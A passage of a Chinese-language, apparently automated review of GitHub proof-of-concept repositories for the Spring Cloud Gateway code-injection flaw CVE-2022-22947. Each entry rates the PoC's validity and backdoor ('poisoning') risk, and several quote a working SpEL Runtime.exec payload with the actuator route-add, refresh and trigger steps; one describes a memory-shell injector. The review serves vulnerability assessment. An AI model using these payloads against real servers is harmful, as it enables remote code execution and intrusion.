**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


